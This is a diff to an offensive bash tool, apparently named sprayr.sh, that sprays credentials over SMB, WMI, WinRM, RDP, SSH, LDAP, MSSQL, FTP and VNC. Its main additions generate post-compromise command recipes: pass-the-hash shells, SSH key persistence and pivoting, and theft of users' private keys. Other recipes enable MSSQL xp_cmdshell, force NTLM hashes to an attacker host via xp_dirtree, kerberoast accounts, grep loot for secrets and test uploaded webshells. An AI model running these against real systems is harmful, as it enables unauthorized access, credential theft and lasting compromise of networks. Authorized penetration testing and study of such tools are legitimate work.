@@ -77,6 +77,7 @@ LM_NT_HASH=""         # normalized LM:NT format
 AUTH_TYPE=""          # "password" | "hash"
 DOMAIN=""
 LOCAL_AUTH=false
+KERBEROS=false        # -k: use Kerberos ccache (KRB5CCNAME or default)
 TARGETS_RAW=""        # raw target string (comma-sep IPs/CIDR)
 TARGET_FILE=""        # target file path
 PROTO_LIST=""         # comma-separated protocols to use
@@ -94,22 +95,32 @@ CRED_DISPLAY=""             # e.g. "admin:Password1" or "admin:<hash>"
 # Protocol → default port mapping
 declare -A PROTO_PORTS=(
     [smb]=445
+    [wmi]=135
     [winrm]=5985
     [ssh]=22
     [rdp]=3389
     [ldap]=389
     [mssql]=1433
     [ftp]=21
+    [vnc]=5900
+)
+
+# Fallback ports for protocols that commonly listen on a secondary port.
+# spray_proto uses any listed port as a live-target indicator.
+declare -A PROTO_ALT_PORTS=(
+    [ldap]=636
+    [winrm]=5986
 )
 
 # Protocols that do NOT support hash auth (NTLM)
 declare -A PROTO_NO_HASH=(
     [ssh]=1
     [ftp]=1
+    [vnc]=1
 )
 
 # Default protocol order (quick = smb only)
-DEFAULT_PROTOS="smb winrm ssh rdp ldap mssql ftp"
+DEFAULT_PROTOS="smb wmi winrm ssh rdp ldap mssql ftp vnc"
 QUICK_PROTOS="smb"
 
 # Child PIDs for cleanup
@@ -347,6 +358,11 @@ build_nxc_auth_args() {
         _out_arr+=(-d "$DOMAIN")
     fi
 
+    # Kerberos auth via ccache (requires KRB5CCNAME or default)
+    if [[ "$KERBEROS" == true ]]; then
+        _out_arr+=(-k --use-kcache)
+    fi
+
     return 0
 }
 
@@ -356,6 +372,7 @@ build_nxc_auth_args() {
 spray_proto() {
     local proto="$1"
     local port="${PROTO_PORTS[$proto]}"
+    local alt_port="${PROTO_ALT_PORTS[$proto]:-}"
     local raw_out="${OUTDIR}/raw/${proto}_spray.txt"
     local proto_upper
     proto_upper=$(echo "$proto" | tr '[:lower:]' '[:upper:]')
@@ -376,14 +393,18 @@ spray_proto() {
             [[ -n "$t" ]] && live_targets+=("$t")
         done < "$RESOLVED_TARGETS_FILE"
     else
-        # Single IPs — port pre-check each
+        # Single IPs — port pre-check each (also try alt port if configured)
         local t
         while IFS= read -r t; do
             [[ -z "$t" ]] && continue
             if port_open "$t" "$port"; then
                 live_targets+=("$t")
+            elif [[ -n "$alt_port" ]] && port_open "$t" "$alt_port"; then
+                live_targets+=("$t")
             else
-                record_skip "$proto" "$t" "port ${port} closed"
+                local port_desc="$port"
+                [[ -n "$alt_port" ]] && port_desc="${port}/${alt_port}"
+                record_skip "$proto" "$t" "port ${port_desc} closed"
             fi
         done < "$RESOLVED_TARGETS_FILE"
     fi
@@ -441,6 +462,7 @@ generate_next_steps() {
         local proto target cred flag
         local first_smb_pwnd="" first_smb_hit="" first_winrm_pwnd="" first_winrm_hit=""
         local first_rdp_hit="" first_ssh_hit="" first_mssql_hit="" first_ldap_hit="" first_ftp_hit=""
+        local first_wmi_pwnd="" first_wmi_hit="" first_vnc_hit=""
         local hit_user=""
 
         while IFS='|' read -r proto target cred flag; do
@@ -453,6 +475,12 @@ generate_next_steps() {
                     ;;
                 smb*)
                     [[ -z "$first_smb_hit" ]] && first_smb_hit="${target}|${hit_user}"
+                    ;;
+                wmiPWND)
+                    [[ -z "$first_wmi_pwnd" ]] && first_wmi_pwnd="${target}|${hit_user}"
+                    ;;
+                wmi*)
+                    [[ -z "$first_wmi_hit" ]] && first_wmi_hit="${target}|${hit_user}"
                     ;;
                 winrmPWND)
                     [[ -z "$first_winrm_pwnd" ]] && first_winrm_pwnd="${target}|${hit_user}"
@@ -474,6 +502,9 @@ generate_next_steps() {
                     ;;
                 ftp*)
                     [[ -z "$first_ftp_hit" ]] && first_ftp_hit="${target}|${hit_user}"
+                    ;;
+                vnc*)
+                    [[ -z "$first_vnc_hit" ]] && first_vnc_hit="${target}|${hit_user}"
                     ;;
             esac
         done < "$hits_file"
@@ -526,15 +557,40 @@ generate_next_steps() {
             local smb_hit_u="${first_smb_hit##*|}"
             echo ""
             echo "# Valid SMB credentials (non-admin or no Pwn3d marker):"
+            local smb_auth=""
             if [[ "$AUTH_TYPE" == "hash" ]]; then
-                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -H ${NT_HASH} --shares"
-                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -H ${NT_HASH} --users"
-                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -H ${NT_HASH} --groups"
+                smb_auth="-u ${smb_hit_u} -H ${NT_HASH}"
             else
                 local q_smb_hit_pass; printf -v q_smb_hit_pass '%q' "$AUTH_PASS"
-                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -p ${q_smb_hit_pass} --shares"
-                echo "  nxc smb ${smb_hit_t} -u ${smb_hit_u} -p ${q_smb_hit_pass} --users"
-                echo "  smbmap -H ${smb_hit_t} -u ${smb_hit_u} -p ${q_smb_hit_pass}"
+                smb_auth="-u ${smb_hit_u} -p ${q_smb_hit_pass}"
+            fi
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} --shares"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} --users"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} --groups"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} --rid-brute 10000"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} --loggedon-users"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} --sessions"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  smbmap -H ${smb_hit_t} -u ${smb_hit_u} -p ':${NT_HASH}'"
+            else
+                echo "  smbmap -H ${smb_hit_t} -u ${smb_hit_u} -p '${AUTH_PASS}'"
+            fi
+            echo ""
+            echo "# Share content spider + GPP cpassword (SYSVOL):"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} -M spider_plus -o EXCLUDE_DIRS=Windows,WindowsApps,Program\\ Files"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} -M gpp_password"
+            echo "  nxc smb ${smb_hit_t} ${smb_auth} -M gpp_autologin"
+            echo ""
+            echo "# Manual share listing:"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  smbclient -L //${smb_hit_t} -U ${smb_hit_u} --pw-nt-hash ${NT_HASH}"
+            else
+                echo "  smbclient -L //${smb_hit_t} -U '${smb_hit_u}%${AUTH_PASS}'"
+            fi
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  impacket-lookupsid -hashes ${LM_NT_HASH} ${smb_hit_u}@${smb_hit_t}"
+            else
+                echo "  impacket-lookupsid ${smb_hit_u}:'${AUTH_PASS}'@${smb_hit_t}"
             fi
         fi
 
@@ -575,23 +631,83 @@ generate_next_steps() {
             fi
         fi
 
+        # WMI admin (alternative shell when WinRM disabled)
+        if [[ -n "$first_wmi_pwnd" ]]; then
+            local wmi_t="${first_wmi_pwnd%|*}"
+            local wmi_u="${first_wmi_pwnd##*|}"
+            echo ""
+            echo "# Admin shell via WMI (Pwn3d! — fallback when WinRM is disabled):"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                if [[ -n "$DOMAIN" ]]; then
+                    echo "  impacket-wmiexec -hashes ${LM_NT_HASH} ${DOMAIN}/${wmi_u}@${wmi_t}"
+                else
+                    echo "  impacket-wmiexec -hashes ${LM_NT_HASH} ${wmi_u}@${wmi_t}"
+                fi
+                echo "  nxc wmi ${wmi_t} -u ${wmi_u} -H ${NT_HASH} -x whoami"
+            else
+                local q_wmi_pass; printf -v q_wmi_pass '%q' "$AUTH_PASS"
+                if [[ -n "$DOMAIN" ]]; then
+                    echo "  impacket-wmiexec ${DOMAIN}/${wmi_u}:${q_wmi_pass}@${wmi_t}"
+                else
+                    echo "  impacket-wmiexec ${wmi_u}:${q_wmi_pass}@${wmi_t}"
+                fi
+                echo "  nxc wmi ${wmi_t} -u ${wmi_u} -p ${q_wmi_pass} -x whoami"
+            fi
+            echo "  # atexec / dcomexec are further alternatives if wmiexec is filtered:"
+            echo "  #   impacket-atexec / impacket-dcomexec (same auth args)"
+        fi
+
+        # WMI valid login without explicit admin marker
+        if [[ -n "$first_wmi_hit" && -z "$first_wmi_pwnd" ]]; then
+            local wmi_hit_t="${first_wmi_hit%|*}"
+            local wmi_hit_u="${first_wmi_hit##*|}"
+            echo ""
+            echo "# Valid WMI credentials (auth works, admin check inconclusive):"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  nxc wmi ${wmi_hit_t} -u ${wmi_hit_u} -H ${NT_HASH} -x whoami"
+            else
+                local q_wmi_hit_pass; printf -v q_wmi_hit_pass '%q' "$AUTH_PASS"
+                echo "  nxc wmi ${wmi_hit_t} -u ${wmi_hit_u} -p ${q_wmi_hit_pass} -x whoami"
+            fi
+        fi
+
         # RDP
         if [[ -n "$first_rdp_hit" ]]; then
             local rdp_t="${first_rdp_hit%|*}"
             local rdp_u="${first_rdp_hit##*|}"
             echo ""
-            echo "# RDP session:"
+            echo "# RDP session (use xfreerdp3 on current Kali, xfreerdp on older):"
             if [[ "$AUTH_TYPE" == "hash" ]]; then
                 if [[ -n "$DOMAIN" ]]; then
                     echo "  xfreerdp3 /u:${rdp_u} /d:${DOMAIN} /pth:${NT_HASH} /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
+                    echo "  xfreerdp  /u:${rdp_u} /d:${DOMAIN} /pth:${NT_HASH} /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
                 else
                     echo "  xfreerdp3 /u:${rdp_u} /pth:${NT_HASH} /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
+                    echo "  xfreerdp  /u:${rdp_u} /pth:${NT_HASH} /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
                 fi
             elif [[ -n "$DOMAIN" ]]; then
                 echo "  xfreerdp3 /u:${rdp_u} /d:${DOMAIN} /p:'${AUTH_PASS}' /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
+                echo "  xfreerdp  /u:${rdp_u} /d:${DOMAIN} /p:'${AUTH_PASS}' /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
             else
                 echo "  xfreerdp3 /u:${rdp_u} /p:'${AUTH_PASS}' /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
+                echo "  xfreerdp  /u:${rdp_u} /p:'${AUTH_PASS}' /v:${rdp_t} /cert:ignore +clipboard /dynamic-resolution"
             fi
+        fi
+
+        # VNC (no username/domain — password only)
+        if [[ -n "$first_vnc_hit" ]]; then
+            local vnc_t="${first_vnc_hit%|*}"
+            echo ""
+            echo "# VNC session:"
+            if [[ "$AUTH_TYPE" == "hash" ]]; then
+                echo "  # (VNC does not support NTLM — use the plaintext password)"
+            else
+                echo "  vncviewer ${vnc_t}:5900   # enter password when prompted: ${AUTH_PASS}"
+                echo "  # Alternative GUI: remmina -c vnc://${vnc_t}"
+            fi
+            echo ""
+            echo "# Password reuse — try this VNC password on other protocols:"
+            echo "  ./sprayr.sh -u administrator -p '${AUTH_PASS:-<VNC_PASS>}' -t <range> --proto smb,winrm,wmi,rdp,ssh"
         fi
 
         # SSH
@@ -602,27 +718,81 @@ generate_next_steps() {
             echo "# SSH session:"
             echo "  ssh ${ssh_u}@${ssh_t}"
             echo ""
+            echo "# Immediate checks after login (copy-paste one-liner):"
+            echo "  ssh ${ssh_u}@${ssh_t} 'id; sudo -n -l; find / -perm -4000 -type f 2>/dev/null | head; cat /etc/os-release'"
+            echo ""
             echo "# Enumerate for privilege escalation:"
             echo "  # From Kali — stage privesc tools and follow printed transfer/run commands:"
             echo "  ./escalatr.sh ${ssh_t} --os linux"
             echo "  # Or drop lootr.sh directly on target:"
             echo "  scp ~/scripts/lootr.sh ${ssh_u}@${ssh_t}:/tmp/lootr.sh"
             echo "  ssh ${ssh_u}@${ssh_t} 'bash /tmp/lootr.sh'"
+            echo ""
+            echo "# SOCKS pivot (access internal network through this host):"
+            echo "  ssh -D 1080 -N ${ssh_u}@${ssh_t}"
+            echo "  # Configure proxychains: 'socks5 127.0.0.1 1080' in /etc/proxychains.conf"
+            echo ""
+            echo "# ProxyJump pivot to internal host:"
+            echo "  ssh -J ${ssh_u}@${ssh_t} <internal_user>@<internal_host>"
+            echo ""
+            echo "# Key-based persistence (authorized_keys append if writable):"
+            echo "  ssh-keygen -t ed25519 -N '' -f /tmp/offsec_key"
+            echo "  cat /tmp/offsec_key.pub | ssh ${ssh_u}@${ssh_t} 'mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys'"
+            echo "  ssh -i /tmp/offsec_key ${ssh_u}@${ssh_t}"
+            echo ""
+            echo "# Also check for in-home SSH private keys (pivot to other accounts/hosts):"
+            echo "  ssh ${ssh_u}@${ssh_t} 'cat ~/.ssh/id_* 2>/dev/null; cat ~/.ssh/config 2>/dev/null'"
         fi
 
         # MSSQL
         if [[ -n "$first_mssql_hit" ]]; then
             local sql_t="${first_mssql_hit%|*}"
             local sql_u="${first_mssql_hit##*|}"
+            local sql_auth=""
+            local mssql_cli=""
             echo ""
             echo "# MSSQL access:"
             if [[ "$AUTH_TYPE" == "hash" ]]; then
-                echo "  nxc mssql ${sql_t} -u ${sql_u} -H ${NT_HASH} -q 'SELECT @@version'"
+                sql_auth="-u ${sql_u} -H ${NT_HASH}"
+                if [[ -n "$DOMAIN" ]]; then
+                    mssql_cli="impacket-mssqlclient -hashes ${LM_NT_HASH} -windows-auth ${DOMAIN}/${sql_u}@${sql_t}"
+                else
+                    mssql_cli="impacket-mssqlclient -hashes ${LM_NT_HASH} ${sql_u}@${sql_t}"
+                fi
             else
-                echo "  nxc mssql ${sql_t} -u ${sql_u} -p '${AUTH_PASS}' -q 'SELECT @@version'"
+                local q_sql_pass; printf -v q_sql_pass '%q' "$AUTH_PASS"
+                sql_auth="-u ${sql_u} -p ${q_sql_pass}"
+                if [[ -n "$DOMAIN" ]]; then
+                    mssql_cli="impacket-mssqlclient -windows-auth ${DOMAIN}/${sql_u}:${q_sql_pass}@${sql_t}"
+                else
+                    mssql_cli="impacket-mssqlclient ${sql_u}:${q_sql_pass}@${sql_t}"
+                fi
             fi
-            echo "  # If login is privileged, check command execution:"
-            echo "  # SQL> EXEC xp_cmdshell 'whoami'"
+            echo "  nxc mssql ${sql_t} ${sql_auth} -q 'SELECT @@version'"
+            echo "  ${mssql_cli}"
+            echo ""
+            echo "# Privilege & configuration probes:"
+            echo "  # Check current role:"
+            echo "  #   SQL> SELECT IS_SRVROLEMEMBER('sysadmin'), SUSER_SNAME();"
+            echo "  # List other logins (useful for impersonation):"
+            echo "  #   SQL> SELECT name, is_disabled FROM master.sys.server_principals WHERE type_desc = 'SQL_LOGIN';"
+            echo "  # Find impersonation paths:"
+            echo "  #   SQL> SELECT grantee_principal_id, grantor_principal_id FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';"
+            echo "  # Linked servers (pivot to other DBs):"
+            echo "  #   SQL> SELECT srvname, srvproduct FROM master..sysservers;"
+            echo "  #   SQL> EXEC ('SELECT @@version') AT [LINKED_SRV];"
+            echo ""
+            echo "# xp_cmdshell (requires sysadmin — enable then run):"
+            echo "  #   SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;"
+            echo "  #   SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
+            echo "  #   SQL> EXEC xp_cmdshell 'whoami';"
+            echo ""
+            echo "# Hash-steal via xp_dirtree (run Responder on Kali first):"
+            echo "  #   responder -I tun0 -wd"
+            echo "  #   SQL> EXEC xp_dirtree '\\\\\\\\${KALI_IP:-<KALI_IP>}\\\\share', 1, 1;"
+            echo ""
+            echo "# Impersonation recipe (when grant found):"
+            echo "  #   SQL> EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;"
         fi
 
         # LDAP — domain creds
@@ -632,22 +802,47 @@ generate_next_steps() {
             local dom="${DOMAIN:-<DOMAIN>}"
             echo ""
             echo "# Valid domain credentials confirmed via LDAP:"
+            local ldap_auth=""
             if [[ "$AUTH_TYPE" == "hash" ]]; then
+                ldap_auth="-u ${ldp_u} -H ${NT_HASH}"
                 echo "  ./adr.sh -d ${dom} -u ${ldp_u} -H :${NT_HASH} -dc ${ldp_t}"
             else
+                local q_ldap_pass; printf -v q_ldap_pass '%q' "$AUTH_PASS"
+                ldap_auth="-u ${ldp_u} -p ${q_ldap_pass}"
                 echo "  ./adr.sh -d ${dom} -u ${ldp_u} -p '${AUTH_PASS}' -dc ${ldp_t}"
             fi
+            echo ""
+            echo "# nxc ldap enumeration (all read-only):"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --laps"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --gmsa"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --asreproast /tmp/asrep.hashes"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --kerberoasting /tmp/kerb.hashes"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --find-delegation"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --trusted-for-delegation"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --password-not-required"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --admin-count"
+            echo "  nxc ldap ${ldp_t} ${ldap_auth} -d ${dom} --bloodhound --collection All --dns-server ${ldp_t}"
+            echo ""
+            echo "# Crack recovered hashes (if any emitted):"
+            echo "  ./crackr.sh -f /tmp/asrep.hashes -q   # mode 18200"
+            echo "  ./crackr.sh -f /tmp/kerb.hashes -q    # mode 13100/19600/19700"
         fi
 
         # FTP
         if [[ -n "$first_ftp_hit" ]]; then
             local ftp_t="${first_ftp_hit%|*}"
             local ftp_u="${first_ftp_hit##*|}"
+            local ftp_p="${AUTH_PASS:-<PASS>}"
             echo ""
             echo "# FTP access:"
             echo "  ftp ${ftp_t}"
-            echo "  lftp -u ${ftp_u},'${AUTH_PASS:-<PASS>}' ftp://${ftp_t}"
-            echo "  wget -r ftp://${ftp_u}:'${AUTH_PASS:-<PASS>}'@${ftp_t}/"
+            echo "  lftp -u '${ftp_u},${ftp_p}' ftp://${ftp_t}"
+            echo "  wget -m --user='${ftp_u}' --password='${ftp_p}' ftp://${ftp_t}/"
+            echo ""
+            echo "# After mirror — grep for secrets and web roots:"
+            echo "  grep -RniE 'pass|secret|token|key|cred' . 2>/dev/null | head -50"
+            echo "  # If FTP root is web-served (common misconfig), test uploaded webshell:"
+            echo "  curl -s http://${ftp_t}/<uploaded_file>"
         fi
 
         echo ""
@@ -709,6 +904,13 @@ generate_summary() {
             echo "    - Try --local-auth if domain auth failing"
             echo "    - Verify target reachability: ping / nmap -sn"
             echo "    - Check adr.sh output for correct domain name"
+            echo ""
+            echo "  Null / anonymous-auth fallbacks to try (no creds needed):"
+            echo "    nxc smb <targets> -u '' -p ''"
+            echo "    nxc smb <targets> -u 'guest' -p ''"
+            echo "    nxc ldap <dc> -u '' -p '' --users --pass-pol"
+            echo "    rpcclient -U '' -N <dc>   # then: enumdomusers / querydispinfo"
+            echo "    smbclient -L //<target>/ -N"
         fi
 
         echo ""
@@ -749,6 +951,7 @@ AUTHENTICATION:
   -p, --password PASS     Plaintext password
   -H, --hash HASH         NTLM hash (NT-only, :NT, or LM:NT format)
   -d, --domain DOMAIN     Domain name (for domain auth)
+  -k, --kerberos          Use Kerberos authentication (kcache from KRB5CCNAME)
   --local-auth            Local authentication (no domain)
 
 TARGETS:
@@ -757,7 +960,7 @@ TARGETS:
 
 OPTIONS:
   --proto LIST            Comma-separated protocols (default: all)
-                          Available: smb, winrm, ssh, rdp, ldap, mssql, ftp
+                          Available: smb, winrm, wmi, ssh, rdp, ldap, mssql, ftp, vnc
   --quick                 SMB only — fastest validation
   --safe                  Add 2s jitter between attempts (lockout safety)
   --threads N             nxc thread count (default: 20)
@@ -787,10 +990,12 @@ EXAMPLES:
   ./sprayr.sh -u admin -p 'Pass' -t 192.168.1.10 --proto smb,winrm,ldap
 
 NOTES:
-  - Hash auth: SSH and FTP do not support NTLM — auto-skipped
+  - Hash auth: SSH, FTP, VNC do not support NTLM — auto-skipped
+  - VNC has no username concept — accepts password/hash-less tests only
   - (Pwn3d!) = local admin access on that host
   - Use --safe when spraying domain accounts (prevents lockouts)
   - Check adr.sh output for password policy before domain sprays
+  - Kerberos (-k) requires a valid ccache: export KRB5CCNAME=/path/to/ccache
   - hits.txt and pwnd.txt are written atomically — survive Ctrl+C
 
 EOF
@@ -981,6 +1186,8 @@ main() {
                 DOMAIN="$2"; shift 2 ;;
             --local-auth)
                 LOCAL_AUTH=true; shift ;;
+            -k|--kerberos)
+                KERBEROS=true; shift ;;
             -t|--targets)
                 [[ $# -lt 2 ]] && { error "--targets requires an argument"; exit 1; }
                 TARGETS_RAW="$2"; shift 2 ;;
@@ -1190,7 +1397,9 @@ main() {
     #--- Domain spray lockout warning ------------------------------------------
     if [[ -n "$DOMAIN" && -n "$AUTH_USER_FILE" ]]; then
         warn "DOMAIN SPRAY ACTIVE — verify lockout policy before proceeding!"
-        warn "Use adr.sh to check: ./adr.sh -d ${DOMAIN} ... --quick"
+        warn "Check the domain password policy first (null-auth often works):"
+        warn "  nxc smb <dc> -u '' -p '' --pass-pol"
+        warn "Or via authenticated enum: ./adr.sh -d ${DOMAIN} ... --quick"
         warn "Use --safe to run protocols sequentially with jitter"
         echo ""
     fi
